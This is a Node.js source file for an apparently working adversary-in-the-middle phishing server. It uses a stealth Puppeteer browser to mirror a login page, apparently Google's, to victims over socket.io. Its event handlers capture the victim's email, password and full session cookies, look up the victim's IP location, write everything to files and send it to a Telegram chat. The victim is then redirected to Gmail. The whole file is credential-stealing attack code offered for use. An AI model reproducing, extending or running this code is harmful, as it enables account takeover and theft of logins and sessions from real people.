const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cheerio = require('cheerio');
const express = require('express');
const https = require('https');
const http = require('http');
const { Server } = require("socket.io");
const diffdom = require('diff-dom');
const dd = new diffdom.DiffDOM();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const prettier = require('prettier');
const atob = require('atob');
const btoa = require('btoa');
const chalk = require('chalk');

const logFile = fs.createWriteStream(path.join(__dirname, 'server.log'), { flags: 'a' });
const log = (message) => {
  logFile.write(`${new Date().toISOString()} - ${message}\n`);
  console.log(message);
};

const requestCache = new Map();

function run(config) {
  const {
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
    CACHED_RESOURCES_DIR = './cached_resources',
  } = require('./config');

  let bot;
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
  }

  const {
    setupSocketEvents
  } = require('./components/setupSocketEvents');
  const {
    setupChangeListeners
  } = require('./components/setupPuppeteerChangeListeners');
  const {
    stripCssComments,
    sleep,
    getHashedFileName,
    toAbsoluteUrl
  } = require('./components/utils.js');
  const {
    getMainAndIframesWithoutScripts,
    processHtmlContent
  } = require('./components/resourceProcessing');

  let clientIp, server, email, password;
  const proxyConfig = require(`./proxy_page/${config.phishlet}.js`);

  const stealthPlugin = StealthPlugin();
  stealthPlugin.enabledEvasions.delete('iframe.contentWindow');
  stealthPlugin.enabledEvasions.delete('media.codecs');
  puppeteer.use(stealthPlugin);

  const app = express();

  if (config.scheme === 'https') {
    server = https.createServer({
      key: fs.readFileSync('key.pem'),
      cert: fs.readFileSync('cert.pem')
    }, app);
  } else {
    server = http.createServer(app);
  }

  const io = new Server(server, { cors: { origin: '*' } });

  app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdiffer.html'));
  });
  app.get('/iframeScript.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'iframeScript.html'));
  });
  app.get('/domdiffer.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdiffer.js'));
  });
  app.get('/domdifferscript.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdifferscript.js'));
  });
  app.get('/jquery.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'jquery.js'));
  });
  app.get('/getContent', (req, res) => {
    const url = decodeURIComponent(req.query.url);
    const filepath = path.join(CACHED_RESOURCES_DIR, url);
    if (fs.existsSync(filepath)) {
      const data = JSON.parse(fs.readFileSync(filepath));
      res.setHeader('Content-Type', data.mime);
      if (!data.mime.startsWith('text/')) {
        res.send(Buffer.from(data.data, 'base64'));
      } else {
        res.send(data.data);
      }
    } else {
      res.status(404).send('File not found');
    }
  });

  [CACHED_RESOURCES_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  });

  io.on('connection', async (socket) => {
    clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    const puppet = await puppeteer.launch({
      headless: false,
      devtools: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-spki-list',
        '--disable-web-security',
        '--allow-running-insecure-content',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--enable-features=NetworkService',
        '--hide-scrollbars',
        '--mute-audio',
        '--disable-extensions',
        '--no-first-run',
        '--no-default-browser-check',
      ],
    });

    socket.on('disconnect', async () => {
      try {
        await puppet.close();
      } catch (error) {
        log(chalk.red('Closing error Puppeteer:', error.message));
      }
    });

    const page = await puppet.newPage();

    page.on('load', async () => {
      const currentUrl = await page.url();
      log(`Navigating to target URL: ${currentUrl}`);
      const urlObject = new URL(currentUrl);
      const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;
      socket.emit('updateBrowserUrl', { url: pathAndQuery });
    });

    page.on('framenavigated', async () => {
      try {
        await page.waitForNetworkIdle({ idleTime: 1000, timeout: 30000 });
        const currentUrl = await page.url();
        log(`Navigating to target URL: ${currentUrl}`);
        const urlObject = new URL(currentUrl);
        const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;
        socket.emit('updateBrowserUrl', { url: pathAndQuery });
      } catch (error) {
        log(chalk.red('Ошибка навигации:', error.message));
      }
    });

    setInterval(async () => {
      try {
        const currentUrl = await page.url();
        const urlObject = new URL(currentUrl);
        const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;
        socket.emit('updatepuppetUrl', { url: pathAndQuery });
      } catch (error) {
        log(chalk.red('Ошибка опроса URL:', error.message));
      }
    }, 1000);

    await intercept(page, proxyConfig.intercept_urls, body => body);

    await setupSocketEvents(socket, page);
    await setupChangeListeners(socket, page);

    page.on('response', async (response) => {
      if (response.status() >= 300 && response.status() < 400) return;

      try {
        const request = response.request();
        const requestBody = request.postData();

        if (requestBody && requestBody.includes('f.req') && !email && proxyConfig.capture_fields.email) {
          const responseBody = await response.text();
          const emailRegex = proxyConfig.capture_fields.email.search;
          const matches = responseBody.match(emailRegex);

          if (matches && matches.length > 0) {
            email = matches[0];
            log(chalk.green.bold(`Successful login capture: ${email}`));
          }
        }
      } catch (error) {
        log(chalk.red('Processing error ответа:', error.message));
      }
    });

    page.on('request', async (request) => {
      try {
        const postData = request.postData();

        if (postData && postData.includes('f.req=') && !password && proxyConfig.capture_fields.password) {
          const passRegex = proxyConfig.capture_fields.password.search;
          const match = postData.match(passRegex);

          if (match && match[1]) {
            password = match[1];
            log(chalk.green.bold(`Successful password capture: ${password}`));
          }
        }
      } catch (error) {
        log(chalk.red('Error processing request:', error.message));
      }
    });

    page.on('response', async (response) => {
      if (response.url().includes('recaptcha')) {
        log(chalk.red('Detected CAPTCHA'));
        await page.waitForTimeout(5000);
        await page.reload({ waitUntil: 'networkidle0' });
      }
    });

    page.on('load', async () => {
      const currentUrl = page.url();

      if (proxyConfig.auth_urls.some(url => currentUrl.includes(url)) && email && password) {
        try {
          const client = await page.target().createCDPSession();
          await client.send('Network.enable');
          const { cookies } = await client.send('Network.getAllCookies');
          await client.detach();

          log(chalk.green.bold(`Успешный захват куки: ${cookies.length} шт.`));

          const geolocation = await getGeolocation(clientIp);
          const userAgentString = await page.evaluate(() => navigator.userAgent);
          const decodedPassword = password ? decodeURIComponent(password) : password;

          const credentials = `[Captured Creds]
          IP: ${clientIp}
          Username: ${email}
          Password: ${decodedPassword}
          User-Agent: ${userAgentString}
          `;

          log(chalk.green.bold(credentials));

          const credentialsFilePath = `${email}.txt`;
          fs.writeFileSync(credentialsFilePath, credentials, 'utf8');
          log(chalk.green.bold(`Saved to file: ${credentialsFilePath}`));

          const cookiesFilePath = `${email}_cookies.txt`;
          fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2), 'utf8');
          log(chalk.green.bold(`Cookies are saved to the file: ${cookiesFilePath}`));

          if (bot) {
            try {
              await bot.sendMessage(TELEGRAM_CHAT_ID, credentials, {
                parse_mode: 'Markdown',
              });
              log(chalk.green.bold('Data sent to Telegram'));
            } catch (telegramError) {
              log(chalk.red('Error sending to Telegram:', telegramError.message));
            }

            try {
              await bot.sendDocument(TELEGRAM_CHAT_ID, cookiesFilePath, {}, {
                caption: 'Captured Cookies',
              });
              log(chalk.green.bold('Cookie sent to Telegram'));
            } catch (telegramError) {
              log(chalk.red('Error sending cookie to Telegram:', telegramError.message));
            }
          }

          await new Promise(resolve => setTimeout(resolve, 1000));
          socket.emit('redir', { url: 'https://mail.google.com' });

          // Не закрываем страницу сразу
          // await page.goto('about:blank', { waitUntil: 'networkidle0' });
          // await puppet.close();
          // log(chalk.green.bold('Puppeteer закрыт'));
        } catch (error) {
          log(chalk.red('Saving/redirection error:', error.message));
        }
      }
    });

    try {
      log(`Navigating to target URL: ${config.target}`);
      await page.goto(config.target, { waitUntil: 'networkidle0', timeout: 60000 });
    } catch (error) {
      log(chalk.red('Error navigating to target:', error.message));
    }

    let oldhead = '<head></head>';
    let oldbodydiv = '<body></body>';
    const oldiframes = [];

    while (socket.connected) {
      try {
        const data = await getMainAndIframesWithoutScripts(page);
        if (!data) continue;

        const $ = cheerio.load(data.mainhtml);

        const newhead = $('head').first().prop('outerHTML');
        const newbodydiv = $('body').first().prop('outerHTML');

        const changes = {};
        if (oldhead !== newhead) {
          const oldNode = diffdom.stringToObj(oldhead);
          const newNode = diffdom.stringToObj(newhead);
          oldhead = newhead;
          const diff = dd.diff(oldNode, newNode);
          if (!changes.main) changes.main = {};
          changes.main.head = RemoveInvalidAttributesFromDiff(diff);
        }
        if (oldbodydiv !== newbodydiv) {
          const oldNode = diffdom.stringToObj(oldbodydiv);
          const newNode = diffdom.stringToObj(newbodydiv);
          oldbodydiv = newbodydiv;
          const diff = dd.diff(oldNode, newNode);
          if (!changes.main) changes.main = {};
          changes.main.bodydiv = RemoveInvalidAttributesFromDiff(diff);
        }

        if (!changes.iframes) changes.iframes = [];
        data.iframes.forEach(iframe => {
          const iframeRecord = oldiframes.find(item => item.selector === iframe.selector) || {};
          const $iframe = cheerio.load(iframe.content);
          const iframeHead = $iframe('head').first().prop('outerHTML');
          const iframeBody = `<body>${$iframe('body').first().prop('innerHTML')}</body>`;

          if (iframeRecord.oldhead !== iframeHead || iframeRecord.oldbodydiv !== iframeBody) {
            const iframeChanges = {};
            if (iframeRecord.oldhead !== iframeHead) {
              const oldNode = diffdom.stringToObj(iframeRecord.oldhead || '<head></head>');
              const newNode = diffdom.stringToObj(iframeHead);
              iframeRecord.oldhead = iframeHead;
              iframeChanges.head = RemoveInvalidAttributesFromDiff(dd.diff(oldNode, newNode));
            }
            if (iframeRecord.oldbodydiv !== iframeBody) {
              const oldNode = diffdom.stringToObj(iframeRecord.oldbodydiv || '<body></body>');
              const newNode = diffdom.stringToObj(iframeBody);
              iframeRecord.oldbodydiv = iframeBody;
              iframeChanges.bodydiv = RemoveInvalidAttributesFromDiff(dd.diff(oldNode, newNode));
            }
            if (Object.keys(iframeChanges).length > 0) {
              changes.iframes.push({ selector: iframe.selector, ...iframeChanges });
            }
          }
        });

        if (Object.keys(changes).length > 0) {
          socket.emit('domchanges', changes);
        }

        await sleep(1000); 
      } catch (error) {
        log(chalk.red('Error processing changes DOM:', error.message));
        if (error.message.includes('detached Frame')) {
          break; 
        }
      }
    }
  });

  async function intercept(page, patterns, transform) {
    try {
      const client = await page.target().createCDPSession();
      await client.send('Network.enable');
      await client.send('Network.setRequestInterception', {
        patterns: patterns.map(pattern => ({
          urlPattern: pattern,
          resourceType: 'Script',
          interceptionStage: 'HeadersReceived'
        }))
      });

      client.on('Network.requestIntercepted', async ({ interceptionId, request, responseHeaders, resourceType }) => {
        try {
          const response = await client.send('Network.getResponseBodyForInterception', { interceptionId });
          const contentTypeHeader = Object.keys(responseHeaders).find(k => k.toLowerCase() === 'content-type');
          let newBody, contentType = responseHeaders[contentTypeHeader];

          if (requestCache.has(response.body)) {
            newBody = requestCache.get(response.body);
          } else {
            const bodyData = response.base64Encoded ? atob(response.body) : response.body;
            newBody = resourceType === 'Script' ? transform(bodyData) : bodyData;
            requestCache.set(response.body, newBody);
          }

          const newHeaders = [
            'Date: ' + (new Date()).toUTCString(),
            'Connection: closed',
            'Content-Length: ' + newBody.length,
            'Content-Type: ' + contentType
          ];

          await client.send('Network.continueInterceptedRequest', {
            interceptionId,
            rawResponse: btoa('HTTP/1.1 200 OK' + '\r\n' + newHeaders.join('\r\n') + '\r\n\r\n' + newBody)
          });
        } catch (error) {
          log(chalk.red(`Error processing interception ${interceptionId}:`, error.message));
        }
      });
    } catch (error) {
      log(chalk.red('Interception setup error:', error.message));
    }
  }

  function transform(source) {
    try {
      return prettier.format(source, { parser: 'babel' });
    } catch (err) {
      log(chalk.red('Source code formatting error:', err.message));
      return source;
    }
  }

  function RemoveInvalidAttributesFromDiff(diffobj) {
    try {
      function traverse(obj) {
        if (typeof obj === 'object' && obj !== null) {
          if (obj.hasOwnProperty('attributes')) {
            const regex = /^[a-zA-Z][a-zA-Z0-9-_]*$/;
            for (const key in obj.attributes) {
              if (!regex.test(key)) delete obj.attributes[key];
            }
          }
          for (const key in obj) traverse(obj[key]);
        }
      }
      traverse(diffobj);
      return diffobj;
    } catch (err) {
      log(chalk.red('Parse error diff JSON:', err.message));
    }
  }

  async function getGeolocation(ip) {
    try {
      const response = await axios.get(`https://ipinfo.io/${ip}/json`);
      const { city, region: state, country, loc } = response.data;
      const [latitude, longitude] = loc ? loc.split(',') : ['Unknown', 'Unknown'];
      return { city: city || 'Unknown', state: state || 'Unknown', country: country || 'Unknown', longitude, latitude };
    } catch (error) {
      log(chalk.red('Error getting geolocation:', error.message));
      return { city: 'Unknown', state: 'Unknown', country: 'Unknown', longitude: 'Unknown', latitude: 'Unknown' };
    }
  }

  server.listen(config.port, config.ip, () => {
    log(chalk.green.bold(`Сервер запущен на ${config.scheme}://${config.ip}:${config.port}`));
  });
}

if (require.main === module) {
  const config = JSON.parse(process.env.CONFIG || '{}');
  run(config);
}

module.exports = { run };